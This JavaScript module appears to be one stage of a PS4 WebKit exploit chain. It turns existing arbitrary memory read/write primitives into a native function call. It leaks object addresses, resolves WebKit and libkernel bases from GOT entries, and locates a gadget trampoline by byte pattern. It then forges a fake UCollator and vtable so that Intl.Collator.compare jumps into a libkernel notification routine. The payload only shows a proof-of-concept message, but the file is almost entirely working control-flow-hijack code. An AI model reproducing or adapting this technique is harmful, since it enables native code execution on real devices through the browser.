/**
 * PS4 port of slopkit notify native-call (Intl.Collator.compare → lk trampoline).
 * Runs post slopkit-core-1 primitive — no Math.expm1 pivot.
 */
import { int64 } from "./int64.js";

const COLLATOR_UCOLLATOR_OFF = 0x18;
const COLLATOR_BOUND_COMPARE_OFF = 0x10;
const ARENA_BYTES = 0x1000;
const FAKE_UCOLLATOR_OFFSET = 0x100;
const FAKE_VTABLE_OFFSET = 0x300;
const ARENA_MARKER_OFF = 0xf00;
const ARENA_MARKER = 0x52;
const NOTIFICATION_REQUEST_SIZE = 0xc30;
const NOTIFICATION_MESSAGE_OFFSET = 0x2d;
const DEFAULT_MESSAGE = "PS4 WebKit PoC";
const LK_TEXT_SCAN = 0x40000;
const LK_TEXT_SCAN_STEP = 16;
/** slopkit JSArrayBufferView.m_vector — default +0x10 only (OOM-safe) */
const VIEW_VECTOR_DEFAULT = 0x10;
const VIEW_VECTOR_EXTRA = [0x8, 0x18, 0x20];
const TRAMPOLINE_PATTERN = new Uint8Array([
    0x48, 0x8b, 0x8f, 0xe0, 0x00, 0x00, 0x00, 0x51,
    0x48, 0x8b, 0x4f, 0x60, 0x48, 0x8b, 0x7f, 0x48, 0xc3,
]);

function hexParam(q, key, dflt) {
    const raw = q.get(key);
    if (!raw) return dflt;
    const n = parseInt(String(raw).replace(/^0x/i, ""), 16);
    return Number.isFinite(n) && n >= 0 ? n : dflt;
}

function hexListParam(q, key, dflt) {
    const raw = q.get(key);
    if (!raw) return dflt.slice();
    const out = [];
    for (const part of String(raw).split(",")) {
        const n = parseInt(part.trim().replace(/^0x/i, ""), 16);
        if (Number.isFinite(n) && n > 0) out.push(n);
    }
    return out.length ? out : dflt.slice();
}

function ptrBig(v) {
    if (!v) return 0n;
    if (v instanceof int64) return BigInt(v.hi) << 32n | BigInt(v.low >>> 0);
    if (typeof v === "object" && v != null && "low" in v)
        return BigInt(v.hi >>> 0) << 32n | BigInt(v.low >>> 0);
    return 0n;
}

function inPs4ModuleBand(v) {
    const b = ptrBig(v);
    return b >= 0x800000000n && b < 0x900000000n;
}

function pageAligned(v) {
    return (ptrBig(v) & 0x3fffn) === 0n;
}

function putLow48(view, offset, ptr) {
    const p = ptrBig(ptr);
    const lo = Number(p & 0xffffffffn) >>> 0;
    const hi = Number(p >> 32n) >>> 0;
    view[offset] = lo & 0xff;
    view[offset + 1] = (lo >>> 8) & 0xff;
    view[offset + 2] = (lo >>> 16) & 0xff;
    view[offset + 3] = (lo >>> 24) & 0xff;
    view[offset + 4] = hi & 0xff;
    view[offset + 5] = (hi >>> 8) & 0xff;
    view[offset + 6] = 0;
    view[offset + 7] = 0;
}

function readLow48(p, addr) {
    const lo = p.read4(addr);
    const hi = p.read4(addr.add32(4)) & 0xffff;
    return new int64(lo, hi);
}

function readCanonicalPtr(p, addr) {
    let v;
    try { v = p.read8(addr); } catch (_) { return null; }
    if (!v || (v.hi >>> 16) !== 0) return null;
    return v;
}

function plausibleBackingPtr(v) {
    if (!v || !inPs4ModuleBand(v)) return false;
    const b = ptrBig(v);
    return (b & 0xfn) === 0n;
}

function verifyArenaMarker(p, backing) {
    try {
        return p.read1(backing.add32(ARENA_MARKER_OFF)) === ARENA_MARKER;
    } catch (_) {
        return false;
    }
}

function backingFromArrayBufferChain(p, leakval, ab, implOff, dataOff) {
    let cell;
    try { cell = leakval(ab); } catch (_) { return null; }
    let impl;
    try { impl = p.read8(cell.add32(implOff)); } catch (_) { return null; }
    if (!impl || !inPs4ModuleBand(impl)) return null;
    let data;
    try { data = p.read8(impl.add32(dataOff)); } catch (_) { return null; }
    if (!plausibleBackingPtr(data)) return null;
    return data;
}

/**
 * Resolve gigacage backing — 1 leakval + 1–2 reads by default (no bufAddr scan).
 */
function resolveArenaBacking(p, off, arenaBuffer, arenaView, leakval, log, opts) {
    opts = opts || {};
    const arenaScan = opts.arenaScan === true;
    let viewCell;
    try { viewCell = leakval(arenaView); } catch (e) {
        log("NOTIFY-ARENA", "leakval(view) failed: " + (e && e.message ? e.message : e));
        return null;
    }
    log("NOTIFY-ARENA", "viewCell=" + viewCell);

    function trySlot(slot) {
        const ptr = readCanonicalPtr(p, viewCell.add32(slot));
        if (!ptr) return null;
        if (verifyArenaMarker(p, ptr)) {
            log("NOTIFY-ARENA", "m_vector +0x" + slot.toString(16) + " → " + ptr);
            return ptr;
        }
        if (plausibleBackingPtr(ptr))
            log("NOTIFY-ARENA", "+0x" + slot.toString(16) + "=" + ptr + " marker miss");
        return null;
    }

    let hit = trySlot(VIEW_VECTOR_DEFAULT);
    if (hit) return hit;

    if (opts.bufAddrOff) {
        const ba = opts.bufAddrOff;
        const data = backingFromArrayBufferChain(
            p, leakval, arenaBuffer, ba.implOff, ba.dataOff);
        if (data && verifyArenaMarker(p, data)) {
            log("NOTIFY-ARENA", "prep bufAddr impl+0x" + ba.implOff.toString(16) + " → " + data);
            return data;
        }
    }

    const implOff = off.wk_ArrayBuffer_m_impl;
    const dataOff = off.wk_ArrayBuffer_m_contents_m_data;
    if (implOff != null && dataOff != null) {
        const data = backingFromArrayBufferChain(p, leakval, arenaBuffer, implOff, dataOff);
        if (data && verifyArenaMarker(p, data)) {
            log("NOTIFY-ARENA", "table impl+0x" + implOff.toString(16) + " → " + data);
            return data;
        }
    }

    if (arenaScan) {
        for (let i = 0; i < VIEW_VECTOR_EXTRA.length; i++) {
            hit = trySlot(VIEW_VECTOR_EXTRA[i]);
            if (hit) return hit;
        }
    }

    log("NOTIFY-ARENA-FAIL", "no backing @ +0x" + VIEW_VECTOR_DEFAULT.toString(16)
        + (arenaScan ? " (extra slots tried)" : " — add ?arenascan=1"));
    return null;
}

function buildNotificationRequest(message) {
    const msg = message || DEFAULT_MESSAGE;
    const trailing = NOTIFICATION_REQUEST_SIZE - NOTIFICATION_MESSAGE_OFFSET - msg.length;
    if (trailing < 0) throw new Error("notify message too long");
    return "\x00".repeat(NOTIFICATION_MESSAGE_OFFSET) + msg + "\x00".repeat(trailing);
}

function resolveNotifyConfig(off, params) {
    const q = params || new URLSearchParams(location.search);
    const table = off || {};
    return {
        hc: hexListParam(q, "hc", table.wk_notify_hc || []),
        gd: hexParam(q, "gd", table.wk_notify_gd || 0),
        nt: hexParam(q, "nt", table.k_notify || 0),
        gps: hexParam(q, "gps", table.wk_gps || 0),
        gpe: hexParam(q, "gpe", table.wk_gpe || 0),
        cls: hexParam(q, "cls", table.wk_cls || 0),
        cle: hexParam(q, "cle", table.wk_cle || 0),
        ers: hexParam(q, "ers", table.wk_ers || 0),
        ere: hexParam(q, "ere", table.k__error || table.wk_ere || 0),
        message: q.get("msg") || DEFAULT_MESSAGE,
    };
}

function deriveWebkitFromHc(p, leakval, hcList, log) {
    if (!hcList.length) return null;
    let parseIntFn = null;
    try { parseIntFn = parseInt; } catch (_) { return null; }
    let fnCell;
    try { fnCell = leakval(parseIntFn); } catch (_) { return null; }
    const execOff = 0x18;
    const ctorOff = 0x30;
    let executable;
    try { executable = readLow48(p, fnCell.add32(execOff)); } catch (_) { return null; }
    let constructor;
    try { constructor = readLow48(p, executable.add32(ctorOff)); } catch (_) { return null; }
    for (const hcRva of hcList) {
        const wb = constructor.sub32(hcRva);
        if (inPs4ModuleBand(wb) && pageAligned(wb)) {
            log("NOTIFY-WK", "hc=0x" + hcRva.toString(16) + " wb=" + wb);
            return wb;
        }
    }
    return null;
}

function resolveLibkernelFromGot(p, webkitBase, cfg, log) {
    if (!cfg.gps || !cfg.gpe || !cfg.cls || !cfg.cle || !cfg.ers || !cfg.ere)
        return null;
    const slots = [
        { slot: cfg.gps, exp: cfg.gpe, tag: "getpid" },
        { slot: cfg.cls, exp: cfg.cle, tag: "close" },
        { slot: cfg.ers, exp: cfg.ere, tag: "error" },
    ];
    const bases = [];
    for (const s of slots) {
        const slotAddr = webkitBase.add32(s.slot);
        const ptr = readCanonicalPtr(p, slotAddr);
        if (!ptr || !inPs4ModuleBand(ptr)) {
            log("NOTIFY-GOT", s.tag + " bad slot @" + slotAddr);
            return null;
        }
        const base = ptr.sub32(s.exp);
        if (!inPs4ModuleBand(base) || !pageAligned(base)) {
            log("NOTIFY-GOT", s.tag + " bad base " + base);
            return null;
        }
        bases.push(base);
    }
    if (!(bases[0].low === bases[1].low && bases[0].hi === bases[1].hi
        && bases[0].low === bases[2].low && bases[0].hi === bases[2].hi)) {
        log("NOTIFY-GOT", "GOT mismatch getpid/close/error");
        return null;
    }
    log("NOTIFY-LK", "GOT agree lk=" + bases[0]);
    return bases[0];
}

function findTrampolineRva(p, lk, knownRva, log, opts) {
    opts = opts || {};
    const allowScan = opts.gdScan === true;
    const verifyGd = opts.gdVerify === true;
    if (knownRva > 0 && !verifyGd) {
        log("NOTIFY-GD", "trust gd=0x" + knownRva.toString(16) + " (0 reads)");
        return knownRva;
    }
    if (knownRva > 0 && verifyGd) {
        try {
            const addr = lk.add32(knownRva);
            let ok = true;
            for (let i = 0; i < TRAMPOLINE_PATTERN.length; i++) {
                if (p.read1(addr.add32(i)) !== TRAMPOLINE_PATTERN[i]) { ok = false; break; }
            }
            if (ok) {
                log("NOTIFY-GD", "verified gd=0x" + knownRva.toString(16));
                return knownRva;
            }
            log("NOTIFY-GD", "gd=0x" + knownRva.toString(16) + " bytes mismatch");
        } catch (e) {
            log("NOTIFY-GD", "gd read failed: " + (e && e.message ? e.message : e));
        }
    }
    if (!allowScan) {
        if (knownRva > 0) {
            log("NOTIFY-GD-WARN", "using gd=0x" + knownRva.toString(16) + " unverified");
            return knownRva;
        }
        return null;
    }
    log("NOTIFY-GD-SCAN", "scanning lk .text (OOM risk) max=0x" + LK_TEXT_SCAN.toString(16));
    const patLen = TRAMPOLINE_PATTERN.length;
    for (let rva = 0; rva < LK_TEXT_SCAN; rva += LK_TEXT_SCAN_STEP) {
        try {
            let match = true;
            for (let i = 0; i < patLen; i++) {
                if (p.read1(lk.add32(rva + i)) !== TRAMPOLINE_PATTERN[i]) {
                    match = false;
                    break;
                }
            }
            if (match) {
                log("NOTIFY-GD", "scanned gd=0x" + rva.toString(16));
                return rva;
            }
        } catch (_) { break; }
    }
    return knownRva > 0 ? knownRva : null;
}

function arrayBufferBacking(p, off, arenaBuffer, arenaView, leakval, log, opts) {
    return resolveArenaBacking(p, off, arenaBuffer, arenaView, leakval, log, opts);
}

/**
 * Pin collator + arena @ PRIMITIVE-OK while heap is fresh (OOM-safe notify path).
 */
export function pinNotifyHeap(ctx) {
    const p = ctx.p;
    const off = ctx.off || {};
    const log = ctx.log || function () { };
    const leakval = ctx.leakval;
    const retain = ctx.retain || [];
    const cfg = resolveNotifyConfig(off, ctx.params);

    log("NOTIFY-PIN", "collator + arena @ fresh heap");
    const realCollator = new Intl.Collator("en", { usage: "search" });
    const compareFn = realCollator.compare;
    if (!(compareFn("a", "b") < 0))
        throw new Error("notify pin: collator prewarm failed");

    const notificationRequest = buildNotificationRequest(cfg.message);
    const arenaBuffer = new ArrayBuffer(ARENA_BYTES);
    const arenaView = new Uint8Array(arenaBuffer);
    arenaView[ARENA_MARKER_OFF] = 0x52;
    arenaView[ARENA_MARKER_OFF + 1] = 0x4f;
    arenaView[ARENA_MARKER_OFF + 2] = 0x50;
    arenaView[ARENA_MARKER_OFF + 3] = 0x31;
    retain.push(realCollator, compareFn, arenaBuffer, arenaView, notificationRequest);

    const realCollatorAddr = leakval(realCollator);
    const compareFnAddr = readLow48(p, realCollatorAddr.add32(COLLATOR_BOUND_COMPARE_OFF));
    const arenaBacking = arrayBufferBacking(
        p, off, arenaBuffer, arenaView, leakval, log, {
            bufAddrOff: ctx.bufAddrOff || null,
            arenaScan: ctx.params && ctx.params.get("arenascan") === "1",
        });
    if (!arenaBacking)
        throw new Error("notify pin: arena backing @ +0x10 failed");

    log("NOTIFY-PIN-OK", "collator=" + realCollatorAddr + " arena=" + arenaBacking);
    return {
        realCollator,
        compareFn,
        notificationRequest,
        arenaBuffer,
        arenaView,
        arenaBacking,
        realCollatorAddr,
        compareFnAddr,
        webkitBase: ctx.webkitBase || null,
        nativeFn: ctx.nativeFn || null,
        cfg,
    };
}

/**
 * Stage Collator notify — builds arena fakes, resolves lk/gd/nt.
 * @returns {object} staged state for fireCollatorNotify
 */
export function stageCollatorNotify(ctx) {
    const p = ctx.p;
    const off = ctx.off || {};
    const log = ctx.log || function () { };
    const leakval = ctx.leakval;
    const retain = ctx.retain || [];
    const cfg = resolveNotifyConfig(off, ctx.params);

    if (!p || typeof p.read8 !== "function")
        throw new Error("notify: need window.p");
    if (typeof leakval !== "function")
        throw new Error("notify: need leakval");

    log("NOTIFY-STAGE", "resolve bases…");

    let webkitBase = ctx.webkitBase || null;
    if (!webkitBase && ctx.nativeFn && off.wk_expm1_builtin)
        webkitBase = ctx.nativeFn.sub32(off.wk_expm1_builtin);
    if (!webkitBase && cfg.hc.length && !ctx.pinned)
        webkitBase = deriveWebkitFromHc(p, leakval, cfg.hc, log);
    if (!webkitBase || !inPs4ModuleBand(webkitBase))
        throw new Error("notify: webkitBase missing — Start + Save bases");

    let lk = ctx.lk || null;
    if (lk && !pageAligned(lk))
        lk = new int64(lk.low, lk.hi);
    if (!lk || !inPs4ModuleBand(lk))
        lk = resolveLibkernelFromGot(p, webkitBase, cfg, log);
    if (!lk || !inPs4ModuleBand(lk))
        throw new Error("notify: libkernel missing — Accept fn");

    log("NOTIFY-STAGE", "lk=" + lk + " gd (0-read trust)");
    const gdRva = findTrampolineRva(p, lk, cfg.gd, log, {
        gdScan: ctx.gdScan === true,
        gdVerify: ctx.params && ctx.params.get("gdverify") === "1",
    });
    if (gdRva == null)
        throw new Error("notify: gd trampoline not found — ?gd=0x…");

    const ntRva = cfg.nt;
    if (!ntRva)
        throw new Error("notify: k_notify RVA missing in offset table");

    let realCollator;
    let compareFn;
    let notificationRequest;
    let arenaBuffer;
    let arenaView;
    let realCollatorAddr;
    let compareFnAddr;
    let arenaBacking;
    let prewarm = null;

    if (ctx.pinned) {
        log("NOTIFY-STAGE", "reuse pinned collator+arena");
        const pin = ctx.pinned;
        realCollator = pin.realCollator;
        compareFn = pin.compareFn;
        notificationRequest = pin.notificationRequest;
        arenaBuffer = pin.arenaBuffer;
        arenaView = pin.arenaView;
        realCollatorAddr = pin.realCollatorAddr;
        compareFnAddr = pin.compareFnAddr;
        arenaBacking = pin.arenaBacking;
    } else {
        log("NOTIFY-STAGE", "collator + arena (late pin — OOM risk, reload + Start first)");
        realCollator = new Intl.Collator("en", { usage: "search" });
        compareFn = realCollator.compare;
        if (!(compareFn("a", "b") < 0))
            throw new Error("notify: collator prewarm failed");

        notificationRequest = buildNotificationRequest(cfg.message);
        if (notificationRequest.length !== NOTIFICATION_REQUEST_SIZE)
            throw new Error("notify: bad request layout");

        const prewarmResult = compareFn(notificationRequest, "b");
        if (!Number.isFinite(prewarmResult))
            throw new Error("notify: request prewarm failed");
        prewarm = prewarmResult;
        log("NOTIFY-PREWARM", "result=" + prewarm + " (1 is normal before fake UCollator)");

        arenaBuffer = new ArrayBuffer(ARENA_BYTES);
        arenaView = new Uint8Array(arenaBuffer);
        arenaView[ARENA_MARKER_OFF] = 0x52;
        arenaView[ARENA_MARKER_OFF + 1] = 0x4f;
        arenaView[ARENA_MARKER_OFF + 2] = 0x50;
        arenaView[ARENA_MARKER_OFF + 3] = 0x31;
        retain.push(realCollator, compareFn, arenaBuffer, arenaView, notificationRequest);

        realCollatorAddr = leakval(realCollator);
        compareFnAddr = readLow48(p, realCollatorAddr.add32(COLLATOR_BOUND_COMPARE_OFF));
        log("NOTIFY-STAGE", "resolve arena backing…");
        arenaBacking = arrayBufferBacking(
            p, off, arenaBuffer, arenaView, leakval, log, {
                bufAddrOff: ctx.bufAddrOff || null,
                arenaScan: ctx.params && ctx.params.get("arenascan") === "1",
            });
        if (!arenaBacking)
            throw new Error("notify: arena backing unresolved — see NOTIFY-ARENA-FAIL");
    }

    const verifyMarker = p.read1(arenaBacking.add32(ARENA_MARKER_OFF));
    if (verifyMarker !== ARENA_MARKER)
        throw new Error("notify: arena marker read failed @ " + arenaBacking);

    const fakeUCollatorAddr = arenaBacking.add32(FAKE_UCOLLATOR_OFFSET);
    const fakeVtableAddr = arenaBacking.add32(FAKE_VTABLE_OFFSET);
    const notifyEntry = lk.add32(ntRva);
    const trampoline = lk.add32(gdRva);

    putLow48(arenaView, FAKE_UCOLLATOR_OFFSET + 0x00, fakeVtableAddr);
    for (let i = 0x48; i < 0x50; i++) arenaView[FAKE_UCOLLATOR_OFFSET + i] = 0;
    for (let i = 0x60; i < 0x68; i++) arenaView[FAKE_UCOLLATOR_OFFSET + i] = 0;
    putLow48(arenaView, FAKE_UCOLLATOR_OFFSET + 0xe0, notifyEntry);
    putLow48(arenaView, FAKE_VTABLE_OFFSET + 0x128, trampoline);

    const collatorFieldAddr = realCollatorAddr.add32(COLLATOR_UCOLLATOR_OFF);
    const collatorOriginal = p.read8(collatorFieldAddr);

    log("NOTIFY-STAGE", "wk=" + webkitBase + " lk=" + lk
        + " gd=0x" + gdRva.toString(16) + " nt=0x" + ntRva.toString(16));
    log("NOTIFY-STAGE", "collator=" + realCollatorAddr
        + " compare=" + compareFnAddr + " arena=" + arenaBacking);
    log("NOTIFY-STAGE", "fakeUC=" + fakeUCollatorAddr
        + " notifyEntry=" + notifyEntry + " tramp=" + trampoline);

    return {
        compareFn,
        notificationRequest,
        realCollatorAddr,
        collatorFieldAddr,
        collatorOriginal,
        fakeUCollatorAddr,
        webkitBase,
        lk,
        gdRva,
        ntRva,
        notifyEntry,
        prewarm,
    };
}

/**
 * Fire notification via Collator.compare native path.
 * @returns {{ result: number, sent: boolean }}
 */
export function fireCollatorNotify(st) {
    if (!st || !st.compareFn)
        throw new Error("notify: not staged");
    const { compareFn, notificationRequest, collatorFieldAddr,
        collatorOriginal, fakeUCollatorAddr, p } = st;
    if (!p) throw new Error("notify: p missing on state");

    p.write8(collatorFieldAddr, fakeUCollatorAddr);
    let notifyResult = NaN;
    let callError = null;
    try {
        notifyResult = compareFn(notificationRequest, "b");
    } catch (err) {
        callError = err;
    }
    p.write8(collatorFieldAddr, collatorOriginal);

    if (callError)
        throw callError;

    const ok = Number.isFinite(notifyResult) && Math.floor(notifyResult) === notifyResult;
    const sent = ok && notifyResult === 0;
    return { result: notifyResult, sent, ok };
}

/** One-shot stage + fire. */
export function runCollatorNotify(ctx) {
    const log = ctx.log || function () { };
    const st = stageCollatorNotify(ctx);
    st.p = ctx.p;
    log("NOTIFY-COMMIT", "patch collator → compareFn(0xc30 request)");
    const out = fireCollatorNotify(st);
    log("NOTIFY-DONE", "result=" + out.result + " sent=" + out.sent);
    return Object.assign({ staged: st }, out);
}

export {
    NOTIFICATION_REQUEST_SIZE,
    NOTIFICATION_MESSAGE_OFFSET,
    DEFAULT_MESSAGE,
    resolveNotifyConfig,
    buildNotificationRequest,
};
